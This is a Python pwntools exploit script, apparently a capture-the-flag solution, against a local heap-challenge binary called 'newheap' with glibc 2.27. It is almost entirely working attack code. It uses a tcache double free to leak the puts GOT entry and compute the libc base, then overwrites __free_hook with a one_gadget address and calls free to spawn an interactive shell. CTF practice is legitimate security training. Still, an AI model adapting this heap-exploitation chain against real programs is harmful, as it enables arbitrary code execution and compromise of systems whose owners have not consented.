from pwn import *

sh = process('./newheap')
elf = ELF('./newheap')
libc = ELF('libc-2.27.so')


def new():
  sh.sendlineafter("> ","1")

def edit(idx,note):
  sh.sendlineafter("> ","2")
  sh.sendlineafter("? \n",str(idx))
  sh.sendlineafter("Content? ",note)

def delete(idx):
  sh.sendlineafter("> ","4")
  sh.sendlineafter("? \n",str(idx))

def  show(idx):
  sh.sendlineafter("> ","3")
  sh.sendlineafter("? \n",str(idx))
  sh.recvuntil("Content: ")
 # return sh.recvuntil("\n")

new()
new()
new()

#--------leak libc.base------------------
delete(0)
delete(0)
edit(0,p64(0x60203d))
gdb.attach(sh)
new()
new()
edit(4,'a'*3 +p64(elf.got['puts']))
gdb.attach(sh)
show(0)
puts_got = u64(sh.recvuntil('\n',drop=True).ljust(8,'\x00'))
libc.base = puts_got - libc.symbols['puts']
free_hook = libc.base + libc.symbols['__free_hook']
one_gadget_addr = libc.base+0x4f322
print "libc_base: "+hex(libc.base)
print "free_hook: "+hex(free_hook)

#-------hjack free to getshell-------

edit(4,'a'*3+p64(free_hook))
edit(0,p64(one_gadget_addr))
#gdb.attach(sh)
delete(1)
sh.interactive()
